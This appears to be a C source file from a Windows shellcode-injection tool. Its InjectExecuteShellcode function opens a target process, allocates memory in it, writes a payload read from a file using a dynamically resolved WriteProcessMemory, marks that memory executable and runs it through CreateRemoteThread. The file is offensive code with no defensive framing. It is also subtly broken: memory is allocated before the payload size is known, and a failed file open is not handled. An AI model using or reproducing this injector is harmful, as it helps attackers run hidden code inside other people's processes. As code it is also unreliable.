#include "crt.h"
#include "mem.h"
#include "logger.h"

#ifndef VC_EXTRA_LEAN
#define VC_EXTRA_LEAN
#include <windows.h>
#include <tlhelp32.h>
#endif /* VC_EXTRA_LEAN */

#include <stdlib.h>
#include <stdio.h>

typedef VOID (* exec_mem_t)(void);
typedef WINBOOL (WINAPI * WriteProcessMemory_t)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);

static char* ExtractBytesFromFile(const char* restrict f, size_t* size)
{
    FILE* fp = NULL;

    if ( !(fp = fopen(f, "rb")) )
    {
        fclose(fp);
    }
    fseek(fp, 0, SEEK_END);
    *size = (size_t)ftell(fp);
    fseek(fp, 0, SEEK_SET);

    char* bytesRead = (char *)malloc(*size);
    fread(bytesRead, *size, sizeof(char), fp); 

    return bytesRead;
}

unsigned InjectExecuteShellcode(Resource* restrict pResource, Injector* restrict pInjector)
{
    WriteProcessMemory_t    pWriteProcessMemory = NULL;
    exec_mem_t              exec_mem = NULL;
    HANDLE                  hProcess = NULL;
    HANDLE                  hThread = NULL;
    DWORD                   old_protect = 0;
    BOOL                    bSuccess = 0;
    char*                   payload = 0;
    size_t                  size = 0;

    LogEvent(pInjector, "Opening target process..", 0);
    if (!(hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, pResource->process_id)))
    {
        LogEvent(pInjector, "Failed to acquire handle to target", 0);
        CloseHandle(hProcess);
        return -1u;
    }
    LogEvent(pInjector, "Process Handle to target acquired", 0);

    LogEvent(pInjector, "Allocating virtual memory to target..", 0);
    if (!(exec_mem = (exec_mem_t)VirtualAllocEx(hProcess, NULL, size+1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)))
    {
        LogEvent(pInjector, "Failed to allocate memory to target", 0);
        CloseHandle(hProcess);
        return -1u;
    }
    LogEvent(pInjector, "Allocation successful", 0);

    /*WriteProcessMemory(hProcess, (LPVOID)exec_mem, (LPVOID)payload, size+1, NULL);*/
    LogEvent(pInjector, "Writing payload to executable memory..", 0);
    payload = ExtractBytesFromFile(pResource->dll_rel_path, &size);
    pWriteProcessMemory = (WriteProcessMemory_t)GetProcAddress(GetModuleHandleA("kernel32.dll"), "WriteProcessMemory");
    if (!(pWriteProcessMemory(hProcess, (LPVOID)exec_mem, (LPVOID)payload, size+1, NULL)))
    {
        LogEvent(pInjector, "Failed to write payload to executable memory", 0);
        return -1u;
    }
    LogEvent(pInjector, "Write success", 0);

    LogEvent(pInjector, "Changing virtual protection permissions..", 0);
    if (!(bSuccess = VirtualProtectEx(hProcess, (LPVOID)exec_mem, size, PAGE_EXECUTE_READ, &old_protect)))
    {
        LogEvent(pInjector, "Failed to change virtual protection permissions", 0);
        return -1u;
    }
    LogEvent(pInjector, "Protect changed", 0);

    LogEvent(pInjector, "Creating remote thread..", 0);
    if (!(hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)exec_mem, NULL, 0, NULL)))
    {
        LogEvent(pInjector, "Failed to create remote thread", 0);
        return -1u;
    }
    LogEvent(pInjector, "Remote thread created", 0);
    
    // optional wait for object
    // WaitForSingleObject(hThread, INFINITE);
    
    LogEvent(pInjector, "Closing handle and returning control to owner..", 0);
    CloseHandle(hProcess);
    return 0;
}
